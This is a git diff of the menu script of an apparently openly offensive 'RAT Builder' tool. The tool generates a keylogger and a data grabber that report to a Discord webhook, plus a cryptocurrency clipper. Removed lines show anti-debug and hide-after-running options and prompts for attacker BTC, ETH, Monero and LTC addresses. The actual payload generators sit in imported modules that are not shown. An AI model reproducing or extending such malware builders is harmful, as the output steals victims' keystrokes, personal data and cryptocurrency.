@@ -1,12 +1,12 @@
-from colorama import Fore, init
+from colorama import Fore
 from util.plugins.common import *
-from util.create_payload import CookiesRAT
-from util.create_key_logger import Create_KeyLogger
-from util.create_data_grabber import Create_Data
 from cookies_package import *
 from time import sleep
-init(convert=True)
 
+from util.create_crypto_clipper import Create_Crypto_Clipper
+from util.create_payload import CookiesRAT
+from util.create_key_logger import Create_KeyLogger
+from util.create_data_grabber import Create_Data_Grabber
 
 
 
@@ -35,39 +35,26 @@ def main():
         print(f"{Fore.LIGHTRED_EX}Still in development. . .{Fore.RESET}")
         sleep(1)
         main()
-        # custom_payload()
 
     elif choice == '3':     # Create Keylogger Add on
         clear()
-        WebHook = str(input(
+        webhook = str(input(
             f'{Fore.CYAN}Enter discord webhook {Fore.YELLOW}>> {Fore.RESET}'))
-        send_report_every_sec = str(input(
-            f'{Fore.CYAN}Send reports every how many second {Fore.RESET}({Fore.CYAN}default 60{Fore.RESET}) {Fore.YELLOW}>> {Fore.RESET}'))
-        Create_KeyLogger(WebHook, send_report_every_sec)
+        intervals = str(input(
+            f'{Fore.CYAN}Enter intervals (default 60s) {Fore.YELLOW}>> {Fore.RESET}'))
+        Create_KeyLogger(webhook, intervals)
         main()
 
     elif choice == '4':     # Create Data Grabber Add on
         clear()
-        WebHook = str(input(
+        webhook = str(input(
             f'{Fore.CYAN}Enter discord webhook {Fore.YELLOW}>> {Fore.RESET}'))
-        Debug = bool(input(
-            f'{Fore.CYAN}Do u want to enable anti debug? {Fore.RESET}({Fore.CYAN}leave empty for no{Fore.RESET})  {Fore.YELLOW}>> {Fore.RESET}'))
-        Hide = bool(input(
-             f'{Fore.CYAN}Do u want to hide data grabber after running? {Fore.RESET}({Fore.CYAN}leave empty for no{Fore.RESET}) {Fore.YELLOW}>> {Fore.RESET}'))
-        Create_Data(WebHook, Debug, Hide)
+        Create_Data_Grabber(webhook)
         main()
 
     elif choice == '5':     # Create Crypto Clipper Add on
         clear()
-        btc_address = str(input(
-        f"{Fore.LIGHTWHITE_EX}Enter your BTC address {Fore.YELLOW}>>{Fore.RESET} "))
-        eth_address = str(input(
-        f"{Fore.LIGHTWHITE_EX}Enter your ETH address {Fore.YELLOW}>>{Fore.RESET} "))
-        monero_address = str(input(
-        f"{Fore.LIGHTWHITE_EX}Enter your MONERO address {Fore.YELLOW}>>{Fore.RESET} "))
-        ltc_address = str(input(
-        f"{Fore.LIGHTWHITE_EX}Enter your LTC address {Fore.YELLOW}>>{Fore.RESET} "))
-        Create_Crypto_Clipper(btc_address, eth_address, monero_address, ltc_address)
+        Create_Crypto_Clipper()
         main()
 
     elif choice == '420':   # Exit RAT Builder
